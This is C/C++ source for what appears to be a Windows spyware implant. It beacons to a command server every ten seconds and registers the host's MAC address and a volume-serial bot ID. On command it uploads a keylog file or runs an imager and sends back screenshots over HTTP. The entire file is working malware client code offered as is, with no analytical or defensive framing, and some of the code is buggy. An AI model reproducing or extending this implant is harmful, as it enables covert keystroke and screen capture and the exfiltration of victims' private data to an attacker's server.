#include "implant.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "iphlpapi.lib")

void sendFile(char* filename, char* url){
   static char boundary[]  = "PaulIsCool";            //Header boundary

   char header[255];
   char* request;
   char* fileData;
   FILE* pFile;
   int size;
   size_t result;

   //fileData = getFileData(filename, &size);

   // Open file
   pFile = fopen(filename, "rb");

   // obtain file size:
   fseek(pFile , 0 , SEEK_END);
   size = ftell(pFile);
   rewind (pFile);

   // allocate memory to contain the whole file:
   fileData = (char*) malloc (size);

   // copy the file into the buffer:
   result = fread(fileData, 1, size, pFile);

   // terminate
   fclose(pFile);

   //allocate memory to contain the whole file + HEADER
   request = (char*) malloc (size + 4096);

   //print header
   sprintf(header,"Content-Type: multipart/form-data; boundary=%s",boundary);
   sprintf(request,"--%s\r\nContent-Disposition: form-data; name=\"data\"; filename=\"%s\"\r\n",boundary, filename);
   sprintf(request,"%sContent-Type: multipart/form-data\r\n\r\n",request);

   //manually copy fileData into the request to avoid null terminating issues
   int requestSize = strlen(request);
   int tempSize = 0;
   char * basePointer = request + requestSize;
   memcpy(basePointer, fileData, size);
   basePointer += size;
   requestSize += size;
   tempSize = sprintf(basePointer,"\r\n--%s--\r\n"
                     "Content-Disposition: form-data; name=\"userID\"\r\n"
                     "\r\n%s\r\n"
                     "--%s--\r\n"
                     "Content-Disposition: form-data; name=\"implantID\"\r\n"
                     "\r\n%s\r\n"
                     "--%s--\r\n"
                     "Content-Disposition: form-data; name=\"file_type\"\r\n",
                     boundary, ownerID, boundary, botID, boundary);
   basePointer += tempSize;
   requestSize += tempSize;

   if(strstr(filename, ".txt") != NULL){
      tempSize = sprintf(basePointer, "\r\ntext\r\n");
   }
   else{
      tempSize = sprintf(basePointer, "\r\nimage\r\n");
   }
   basePointer += tempSize;
   requestSize += tempSize;
   requestSize += sprintf(basePointer, "--%s--\r\n", boundary);
   //std::cout << header << std::endl << request << std::endl;

   //Open internet connection
   HINTERNET hSession = InternetOpen("Paul was here :)",INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

   HINTERNET hConnect = InternetConnect(hSession, srvrIP, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);

   const char* accept[] = {"*/*", NULL};
   HINTERNET hRequest = HttpOpenRequest(hConnect, _T("POST"), url, NULL, NULL, accept, 0, 1);

   BOOL sent= HttpSendRequest(hRequest, header, strlen(header), request, requestSize);

    //close internet-handles
    HttpEndRequest(hRequest, NULL, 0, 0);
    InternetCloseHandle(hSession);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hRequest);
   return;
}
void sendHeartbeat(){
   static char boundary[]  = "PaulRules";            //Header boundary
   static char url[]       = "heartbeat/";        //URL
   char header[] = "Content-Type: application/x-www-form-urlencoded\r\n";
   char data[256];
   sprintf(data, "userID=%s&botID=%s", ownerID, botID);

   HINTERNET hSession = InternetOpen(_T("Paul was here :)"),INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

   HINTERNET hConnect = InternetConnect(hSession, srvrIP,INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

   HINTERNET hRequest = HttpOpenRequest(hConnect,
                        _T("POST"),
                        _T(url),
                        0, 0, 0, INTERNET_FLAG_KEEP_CONNECTION &&
                        INTERNET_FLAG_NO_CACHE_WRITE, 0);

   BOOL sent= HttpSendRequest(hRequest, header, strlen(header), data, strlen(data));

   recvResponse(hRequest);

   //close internet-handles
   HttpEndRequest(hRequest, NULL, 0, 0);
   InternetCloseHandle(hSession);
   InternetCloseHandle(hConnect);
   InternetCloseHandle(hRequest);
   return;
}

void registerImplant(){
   char* macAddr;
   char header[255];
   char* url = "register_implant/";
   char* request = (char*) malloc(2048);
   static char boundary[]  = "PaulRules";
   getMacAddr(&macAddr);

   sprintf(header,"Content-Type: multipart/form-data; boundary=%s",boundary);

   sprintf(request,"Content-Type: multipart/form-data; boundary=%s"
           "--%s\r\nContent-Disposition: form-data; name=\"implantID\"\r\n"
           "\r\n%s\r\n"
           "--%s--\r\n"
           "Content-Disposition: form-data; name=\"userID\"\r\n"
           "\r\n%s\r\n"
           "--%s--\r\n"
           "Content-Disposition: form-data; name=\"macAddress\"\r\n"
           "\r\n%s\r\n"
           "--%s--\r\n",
           boundary, boundary, botID, boundary, ownerID, boundary, macAddr, boundary);
   //std::cout << request;

   //Open internet connection
   HINTERNET hSession = InternetOpen("Paul was here :)",INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

   HINTERNET hConnect = InternetConnect(hSession, srvrIP, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);

   const char* accept[] = {"*/*", NULL};
   HINTERNET hRequest = HttpOpenRequest(hConnect, _T("POST"), url, NULL, NULL, accept, 0, 1);

   BOOL sent= HttpSendRequest(hRequest, header, strlen(header), request, strlen(request));
   if(!sent){
      std::cerr << "Error sending HTTP" << std::endl;
      exit(-1);
   }

    //close internet-handles
    HttpEndRequest(hRequest, NULL, 0, 0);
    InternetCloseHandle(hSession);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hRequest);
   return;
}

void getMacAddr(char** macAddr){
   IP_ADAPTER_INFO *info = NULL;
   *macAddr = (char*)malloc(17);
   DWORD size = 0;

   //Initial call is to get the size for malloc
   GetAdaptersInfo(info, &size);
   info = (IP_ADAPTER_INFO *)malloc(size);

   //This call will get the actual adapter information
   GetAdaptersInfo(info, &size);

   sprintf(*macAddr, "%02X:%02X:%02X:%02X:%02X:%02X",
           info->Address[0], info->Address[1],
           info->Address[2], info->Address[3],
           info->Address[4], info->Address[5]);
   free(info);
   return;
}

int recvResponse(HINTERNET hRequest){
   DWORD dwSize, dwRead;
   CHAR szrequest[1024];
   if(!InternetQueryDataAvailable(hRequest, &dwSize, 0, 0)){
      std::cout << "QUERYDATA ERROR: " << GetLastError() << std::endl;
   }
   else{
      while(InternetReadFile(hRequest, szrequest, sizeof(szrequest)-1, &dwRead) && dwRead) {
        szrequest[dwRead] = 0;
        dwRead=0;
      }
      parseResponse(szrequest);
   }
   return 0;
}

int parseResponse(char* htmlInput){
   char* input = strstr(htmlInput, "Command:");
   if(input != NULL && input[0] != '\0'){
      int command = atoi(input + 8);
      //std::cout << command;
      switch(command){
         //send keylog file
         case 1: sendFile("\\\\.\\Hd1\\Keylog.txt", "upload/");
                 break;
         //take and send image
         case 2: runImager("\\\\.\\Hd1\\imager.exe");
                 Sleep(1000);
                 sendFile("\\\\.\\Hd1\\img_cap.bmp", "upload/");
                 break;
         case 3: registerImplant();
                 break;
      }
   }
   return 0;
}

char* getFileData(std::string input, int* size){
   std::ifstream in(input, std::ios::binary);
   in.seekg(0, std::ios::end);
   int iSize = in.tellg();
   in.seekg(0, std::ios::beg);

   std::vector<char> pBuff(iSize);
   if ( iSize > 0 ){
      in.read(&pBuff[0], iSize);
   }
   in.close();
   std::string str(pBuff.begin(),pBuff.end());

   return (char*) str.c_str();
}

VOID runImager(LPCTSTR executable){
   // additional information
   STARTUPINFO si;
   PROCESS_INFORMATION pi;

   // set the size of the structures
   ZeroMemory( &si, sizeof(si) );
   si.cb = sizeof(si);
   ZeroMemory( &pi, sizeof(pi) );

  // start the program up
  CreateProcess( executable,   // the path
    NULL,        // Command line
    NULL,           // Process handle not inheritable
    NULL,           // Thread handle not inheritable
    FALSE,          // Set handle inheritance to FALSE
    0,              // No creation flags
    NULL,           // Use parent's environment block
    NULL,           // Use parent's starting directory
    &si,            // Pointer to STARTUPINFO structure
    &pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    );
    // Close process and thread handles.
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow){
//int main(){
   if(!built) {
	     std::cerr << "Error Stub not Built" << std::endl;
	     exit(-1);
   }
   DWORD VolumeSerialNumber=0;
   GetVolumeInformation(_T("C:\\"), NULL, NULL, &VolumeSerialNumber, NULL, NULL, NULL, NULL);
   std::string tempSerial = std::to_string(VolumeSerialNumber);
   botID = (char*) malloc(tempSerial.size());
   strcpy(botID, tempSerial.c_str());

   //std::cout << botID;
   while(1){
      sendHeartbeat();
      Sleep(10000);
   }
   //registerImplant();
   //sendFile("\\\\.\\Hd1\\img_cap.bmp", "upload/");
   //runImager("\\\\.\\Hd1\\imager.exe");
}
